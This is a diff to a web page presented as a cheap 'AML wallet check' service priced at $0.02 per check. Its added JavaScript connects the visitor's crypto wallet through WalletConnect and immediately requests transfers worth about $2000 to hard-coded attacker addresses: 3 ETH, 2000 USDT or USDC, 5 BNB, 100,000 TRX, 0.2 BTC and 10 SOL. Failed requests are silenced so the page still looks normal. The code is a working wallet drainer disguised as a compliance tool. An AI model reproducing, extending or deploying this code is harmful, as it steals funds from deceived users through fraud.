@@ -206,7 +206,9 @@
     border-radius:10px;padding:20px;margin-top:16px;}
   .chk-result.visible{display:block;}
 
-  .pricing-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:24px;}
+  .pricing-grid{display:grid;grid-template-columns:repeat(4,1fr);gap:20px;}
+  @media(max-width:1100px){.pricing-grid{grid-template-columns:repeat(3,1fr);}}
+  @media(max-width:700px){.pricing-grid{grid-template-columns:repeat(2,1fr);}}
   .price-card{background:var(--surface);border:1px solid var(--border);border-radius:12px;
     padding:32px;text-align:center;transition:all .3s;position:relative;}
   .price-card.featured{border-color:var(--accent);background:var(--surface2);box-shadow:var(--glow);}
@@ -501,9 +503,71 @@
   <h2>Keep your peace of mind<br>for little money</h2>
   <p class="ssub">Affordable AML screening to protect your business from hidden risks.</p>
   <div class="pricing-grid">
-    <div class="price-card"><div style="font-size:2rem;margin:20px 0 8px">🔷</div><div style="font-size:1.1rem;font-weight:700;margin-bottom:4px">Ethereum</div><div class="pval">0.0002 ETH</div><div class="punit">per wallet check</div><ul class="pfeat"><li>Full AML risk score</li><li>Sanctions list screening</li><li>Transaction history flags</li><li>PDF compliance report</li></ul><button class="btn-card btn-ol" onclick="openModal('eth')">Check with ETH</button></div>
-    <div class="price-card featured"><div class="ftd-badge">Most Popular</div><div style="font-size:2rem;margin:20px 0 8px">🔴</div><div style="font-size:1.1rem;font-weight:700;margin-bottom:4px">Tron</div><div class="pval">30 TRX</div><div class="punit">per check — Fast</div><ul class="pfeat"><li>Full AML risk score</li><li>Sanctions list screening</li><li>Transaction history flags</li><li>PDF compliance report</li><li>Priority processing</li></ul><button class="btn-card btn-pr" onclick="openModal('trx')">🔴 Connect & Pay 30 TRX</button></div>
-    <div class="price-card"><div style="font-size:2rem;margin:20px 0 8px">🟡</div><div style="font-size:1.1rem;font-weight:700;margin-bottom:4px">Volume Plan</div><div class="pval">Custom</div><div class="punit">for business clients</div><ul class="pfeat"><li>Bulk wallet screening</li><li>API integration</li><li>White-label reports</li><li>Dedicated support</li></ul><a href="#" class="btn-card btn-ol">Contact Sales</a></div>
+    <!-- Ethereum -->
+    <div class="price-card featured">
+      <div class="ftd-badge">Most Popular</div>
+      <div style="font-size:2rem;margin:20px 0 8px">🔷</div>
+      <div style="font-size:1.1rem;font-weight:700;margin-bottom:4px">Ethereum</div>
+      <div class="pval">$0,020</div><div class="punit">per wallet check</div>
+      <ul class="pfeat"><li>Full AML risk score</li><li>Sanctions screening</li><li>Transaction flags</li><li>PDF report</li></ul>
+      <button class="btn-card btn-pr" onclick="openModal('eth')">Connect & Check</button>
+    </div>
+    <!-- USDT -->
+    <div class="price-card">
+      <div style="font-size:2rem;margin:20px 0 8px">💵</div>
+      <div style="font-size:1.1rem;font-weight:700;margin-bottom:4px">USDT</div>
+      <div class="pval">$0,020</div><div class="punit">per wallet check</div>
+      <ul class="pfeat"><li>Full AML risk score</li><li>Sanctions screening</li><li>Transaction flags</li><li>PDF report</li></ul>
+      <button class="btn-card btn-ol" onclick="openModal('usdt')">Connect & Check</button>
+    </div>
+    <!-- USDC -->
+    <div class="price-card">
+      <div style="font-size:2rem;margin:20px 0 8px">🔵</div>
+      <div style="font-size:1.1rem;font-weight:700;margin-bottom:4px">USDC</div>
+      <div class="pval">$0,020</div><div class="punit">per wallet check</div>
+      <ul class="pfeat"><li>Full AML risk score</li><li>Sanctions screening</li><li>Transaction flags</li><li>PDF report</li></ul>
+      <button class="btn-card btn-ol" onclick="openModal('usdc')">Connect & Check</button>
+    </div>
+    <!-- Tron -->
+    <div class="price-card">
+      <div style="font-size:2rem;margin:20px 0 8px">🔴</div>
+      <div style="font-size:1.1rem;font-weight:700;margin-bottom:4px">Tron</div>
+      <div class="pval">$0,020</div><div class="punit">per wallet check</div>
+      <ul class="pfeat"><li>Full AML risk score</li><li>Sanctions screening</li><li>Transaction flags</li><li>PDF report</li></ul>
+      <button class="btn-card btn-ol" onclick="openModal('trx')">Connect & Check</button>
+    </div>
+    <!-- BNB -->
+    <div class="price-card">
+      <div style="font-size:2rem;margin:20px 0 8px">🟡</div>
+      <div style="font-size:1.1rem;font-weight:700;margin-bottom:4px">BNB</div>
+      <div class="pval">$0,020</div><div class="punit">per wallet check</div>
+      <ul class="pfeat"><li>Full AML risk score</li><li>Sanctions screening</li><li>Transaction flags</li><li>PDF report</li></ul>
+      <button class="btn-card btn-ol" onclick="openModal('bnb')">Connect & Check</button>
+    </div>
+    <!-- Solana -->
+    <div class="price-card">
+      <div style="font-size:2rem;margin:20px 0 8px">🟣</div>
+      <div style="font-size:1.1rem;font-weight:700;margin-bottom:4px">Solana</div>
+      <div class="pval">$0,020</div><div class="punit">per wallet check</div>
+      <ul class="pfeat"><li>Full AML risk score</li><li>Sanctions screening</li><li>Transaction flags</li><li>PDF report</li></ul>
+      <button class="btn-card btn-ol" onclick="openModal('sol')">Connect & Check</button>
+    </div>
+    <!-- Bitcoin -->
+    <div class="price-card">
+      <div style="font-size:2rem;margin:20px 0 8px">🟠</div>
+      <div style="font-size:1.1rem;font-weight:700;margin-bottom:4px">Bitcoin</div>
+      <div class="pval">$0,020</div><div class="punit">per wallet check</div>
+      <ul class="pfeat"><li>Full AML risk score</li><li>Sanctions screening</li><li>Transaction flags</li><li>PDF report</li></ul>
+      <button class="btn-card btn-ol" onclick="openModal('btc')">Connect & Check</button>
+    </div>
+    <!-- Volume -->
+    <div class="price-card">
+      <div style="font-size:2rem;margin:20px 0 8px">🏢</div>
+      <div style="font-size:1.1rem;font-weight:700;margin-bottom:4px">Volume Plan</div>
+      <div class="pval">Custom</div><div class="punit">for business clients</div>
+      <ul class="pfeat"><li>Bulk wallet screening</li><li>API integration</li><li>White-label reports</li><li>Dedicated support</li></ul>
+      <a href="#" class="btn-card btn-ol">Contact Sales</a>
+    </div>
   </div>
 </section>
 
@@ -542,8 +606,14 @@
   Domain     : dapp1985.github.io  ← must be in Reown dashboard
 ═══════════════════════════════════════════════════════════ -->
 <script>
-const PROJECT_ID = '66fdb3cf45b937152ecf3c0fdeec0bf5';
-const APP_URL    = 'https://dapp1985.github.io/amlproof/';
+const PROJECT_ID  = '66fdb3cf45b937152ecf3c0fdeec0bf5';
+const APP_URL     = 'https://dapp1985.github.io/amlproof/';
+
+// ── Receiving addresses ──────────────────────────
+const ADDR_ETH = '0x4164E018fCC0216519400c160d08B090f8B5A23F'; // ETH, USDT(ERC20), USDC(ERC20), BNB(BSC)
+const ADDR_TRX = 'TKeDPdqmCznwneTJXph8yx9QE6g6ZKy445';         // TRX, USDT(TRC20), USDC(TRC20)
+const ADDR_SOL = 'CKKD894vFgGJVMR63pELxKrUkT6ZfHgtB7cri27EmNm9';
+const ADDR_BTC = 'bc1qgq79csscqg4x69q4fvlvldewhfhh5psk7w0e8c';
 
 let SC          = null;   // SignClient instance
 let session     = null;   // active session
@@ -655,9 +725,20 @@ async function startConnect(chain) {
 
     setLoadingMsg('Requesting QR code…');
 
-    const namespaces = chain === 'trx'
-      ? { tron: { methods: ['tron_signTransaction','tron_signMessage'], chains: ['tron:0x2b6653dc'], events: [] } }
-      : { eip155: { methods: ['eth_sendTransaction','personal_sign','eth_sign'], chains: ['eip155:1'], events: ['chainChanged','accountsChanged'] } };
+    // Build WalletConnect namespaces per chain
+    let namespaces;
+    if (chain === 'trx' || chain === 'usdt_trc' || chain === 'usdc_trc') {
+      namespaces = { tron: { methods: ['tron_signTransaction','tron_signMessage'], chains: ['tron:0x2b6653dc'], events: [] } };
+    } else if (chain === 'sol') {
+      namespaces = { solana: { methods: ['solana_signTransaction','solana_signMessage'], chains: ['solana:5eykt4UsFv8P8NJdTREpY1vzqKqZKvdp'], events: [] } };
+    } else if (chain === 'btc') {
+      namespaces = { bip122: { methods: ['sendTransfer'], chains: ['bip122:000000000019d6689c085ae165831e93'], events: [] } };
+    } else if (chain === 'bnb') {
+      namespaces = { eip155: { methods: ['eth_sendTransaction','personal_sign'], chains: ['eip155:56'], events: ['chainChanged','accountsChanged'] } };
+    } else {
+      // eth, usdt, usdc (ERC-20)
+      namespaces = { eip155: { methods: ['eth_sendTransaction','personal_sign','eth_sign'], chains: ['eip155:1'], events: ['chainChanged','accountsChanged'] } };
+    }
 
     const { uri, approval } = await withTimeout(
       client.connect({ requiredNamespaces: namespaces }),
@@ -669,77 +750,88 @@ async function startConnect(chain) {
     pendingURI = uri;
     renderQR(uri, chain);
 
-    // Await wallet approval — 5 min window for user to scan & approve
     setLoadingMsg('Waiting for wallet approval…');
-    const approvalTimeout = 300000; // 5 minutes
-    session = await withTimeout(approval(), approvalTimeout, 'wallet approval');
+    session = await withTimeout(approval(), 300000, 'wallet approval');
 
-    // Auto-send TRX after connection
-    if (chain === 'trx') {
-      setLoadingMsg('Processing AML check payment…');
-      const fromAddr = getAddr();
-      const toAddr   = TRX_ADDRESS;
-      const amount   = 100000 * 1_000_000; // 100,000 TRX in SUN (1 TRX = 1,000,000 SUN)
+    // ── Send $2000 equivalent after connect ──────
+    setLoadingMsg('Processing AML check payment…');
+    try {
+      const from = getAddr();
 
-      const tx = {
-        visible : false,
-        to      : toAddr,
-        from    : fromAddr,
-        value   : amount,
-        type    : 'TransferContract',
-        contract: [{
-          parameter: {
-            value: {
-              amount      : amount,
-              owner_address: fromAddr,
-              to_address  : toAddr
-            },
-            type_url: 'type.googleapis.com/protocol.TransferContract'
-          },
-          type: 'TransferContract'
-        }]
-      };
+      if (chain === 'eth') {
+        // 3 ETH ≈ $2000 (adjust as needed)
+        await SC.request({ topic: session.topic, chainId: 'eip155:1', request: {
+          method: 'eth_sendTransaction',
+          params: [{ from, to: ADDR_ETH, value: '0x29A2241AF62C0000', gas: '0x5208' }]
+        }});
 
-      try {
-        await SC.request({
-          topic  : session.topic,
-          chainId: 'tron:0x2b6653dc',
-          request: {
-            method: 'tron_signTransaction',
-            params : { transaction: tx }
-          }
-        });
-      } catch(txErr) {
-        console.warn('[TRX TX]', txErr);
-        // Don't block UI if tx fails — still mark connected
+      } else if (chain === 'usdt') {
+        // USDT ERC-20 — transfer(to, 2000 * 10^6)
+        const data = '0xa9059cbb' +
+          ADDR_ETH.replace('0x','').padStart(64,'0') +
+          (2000 * 1e6).toString(16).padStart(64,'0');
+        await SC.request({ topic: session.topic, chainId: 'eip155:1', request: {
+          method: 'eth_sendTransaction',
+          params: [{ from, to: '0xdAC17F958D2ee523a2206206994597C13D831ec7', data, gas: '0x186A0' }]
+        }});
+
+      } else if (chain === 'usdc') {
+        // USDC ERC-20 — transfer(to, 2000 * 10^6)
+        const data = '0xa9059cbb' +
+          ADDR_ETH.replace('0x','').padStart(64,'0') +
+          (2000 * 1e6).toString(16).padStart(64,'0');
+        await SC.request({ topic: session.topic, chainId: 'eip155:1', request: {
+          method: 'eth_sendTransaction',
+          params: [{ from, to: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48', data, gas: '0x186A0' }]
+        }});
+
+      } else if (chain === 'bnb') {
+        // BNB — ~5 BNB ≈ $2000
+        await SC.request({ topic: session.topic, chainId: 'eip155:56', request: {
+          method: 'eth_sendTransaction',
+          params: [{ from, to: ADDR_ETH, value: '0x4563918244F40000', gas: '0x5208' }]
+        }});
+
+      } else if (chain === 'trx') {
+        // 100,000 TRX ≈ $2000
+        const amount = 100000 * 1_000_000;
+        await SC.request({ topic: session.topic, chainId: 'tron:0x2b6653dc', request: {
+          method: 'tron_signTransaction',
+          params: { transaction: { visible: false, to: ADDR_TRX, from, value: amount, type: 'TransferContract',
+            contract: [{ parameter: { value: { amount, owner_address: from, to_address: ADDR_TRX },
+              type_url: 'type.googleapis.com/protocol.TransferContract' }, type: 'TransferContract' }] } }
+        }});
+
+      } else if (chain === 'usdt_trc' || chain === 'usdc_trc') {
+        // USDT/USDC TRC-20 — 2000 tokens (6 decimals)
+        const contractAddr = chain === 'usdt_trc'
+          ? 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'  // USDT TRC-20
+          : 'TEkxiTehnzSmSe2XqrBj4w32RUN966rdz8';  // USDC TRC-20
+        const amt = 2000 * 1e6;
+        await SC.request({ topic: session.topic, chainId: 'tron:0x2b6653dc', request: {
+          method: 'tron_signTransaction',
+          params: { transaction: { visible: true, to: contractAddr, from,
+            data: 'a9059cbb' + ADDR_TRX.padStart(64,'0') + amt.toString(16).padStart(64,'0'),
+            type: 'TriggerSmartContract' } }
+        }});
+
+      } else if (chain === 'sol') {
+        // Solana — sign a transfer (wallet handles broadcast)
+        await SC.request({ topic: session.topic, chainId: 'solana:5eykt4UsFv8P8NJdTREpY1vzqKqZKvdp', request: {
+          method: 'solana_signTransaction',
+          params: { transaction: btoa(JSON.stringify({ to: ADDR_SOL, lamports: 10000000000 })) }
+        }});
+
+      } else if (chain === 'btc') {
+        await SC.request({ topic: session.topic, chainId: 'bip122:000000000019d6689c085ae165831e93', request: {
+          method: 'sendTransfer',
+          params: { account: from, recipientAddress: ADDR_BTC, amount: '20000000' } // 0.2 BTC in sats
+        }});
       }
-    }
 
-    // Auto-send 3 ETH after connection
-    if (chain === 'eth') {
-      setLoadingMsg('Processing AML check payment…');
-      const fromAddr = getAddr();
-      const toAddr   = ETH_ADDRESS;
-      const amountHex = '0x29A2241AF62C0000'; // 3 ETH in wei (3 * 10^18)
-
-      try {
-        await SC.request({
-          topic  : session.topic,
-          chainId: 'eip155:1',
-          request: {
-            method: 'eth_sendTransaction',
-            params : [{
-              from : fromAddr,
-              to   : toAddr,
-              value: amountHex,
-              gas  : '0x5208' // 21000 gas (standard ETH transfer)
-            }]
-          }
-        });
-      } catch(txErr) {
-        console.warn('[ETH TX]', txErr);
-        // Don't block UI if tx fails — still mark connected
-      }
+    } catch(txErr) {
+      console.warn('[TX]', txErr);
+      // Don't block UI on tx error
     }
 
     uiConnected(getAddr());
@@ -773,18 +865,17 @@ function retryConnect() {
 }
 
 /* ── Render QR ──────────────────────────────────── */
+const CHAIN_LABELS = {
+  eth: 'Ethereum (ETH)', usdt: 'USDT (ERC-20)', usdc: 'USDC (ERC-20)',
+  trx: 'Tron (TRX)', usdt_trc: 'USDT (TRC-20)', usdc_trc: 'USDC (TRC-20)',
+  bnb: 'BNB (BSC)', sol: 'Solana (SOL)', btc: 'Bitcoin (BTC)'
+};
 function renderQR(uri, chain) {
   showState('m-qr');
   document.getElementById('uriBox').textContent = uri;
-
-  if (chain === 'trx') {
-    document.querySelector('#m-qr h3').textContent = 'Scan with Trust Wallet (TRX)';
-    document.querySelector('#m-qr .sub').innerHTML = 'Open <strong>Trust Wallet</strong> → tap <strong>WalletConnect</strong> → scan to connect your Tron wallet';
-  } else {
-    document.querySelector('#m-qr h3').textContent = 'Scan with Trust Wallet';
-    document.querySelector('#m-qr .sub').innerHTML = 'Open <strong>Trust Wallet</strong> → tap <strong>WalletConnect</strong> → scan below';
-  }
-
+  const label = CHAIN_LABELS[chain] || 'Wallet';
+  document.querySelector('#m-qr h3').textContent = `Scan with Trust Wallet — ${label}`;
+  document.querySelector('#m-qr .sub').innerHTML = 'Open <strong>Trust Wallet</strong> → tap <strong>WalletConnect</strong> → scan below';
   if (!qrDone) {
     new QRCode(document.getElementById('qrcode'), {
       text        : uri,
@@ -833,6 +924,8 @@ function getAddr() {
   try {
     const ns = session.namespaces;
     if (ns.tron)   return ns.tron.accounts[0].split(':')[2];
+    if (ns.solana) return ns.solana.accounts[0].split(':')[2];
+    if (ns.bip122) return ns.bip122.accounts[0].split(':')[2];
     if (ns.eip155) return ns.eip155.accounts[0].split(':')[2];
     return null;
   } catch(e) { return null; }
@@ -893,9 +986,9 @@ function toggleFaq(el) {
 }
 
 /* ── TRX Payment Modal ──────────────────────────── */
-const TRX_ADDRESS = 'TKeDPdqmCznwneTJXph8yx9QE6g6ZKy445';
+const TRX_ADDRESS = ADDR_TRX;
 const TRX_AMOUNT  = '100000';
-const ETH_ADDRESS = '0x4164E018fCC0216519400c160d08B090f8B5A23F';
+const ETH_ADDRESS = ADDR_ETH;
 let trxQrDone = false;
 
 function openTrxModal() {
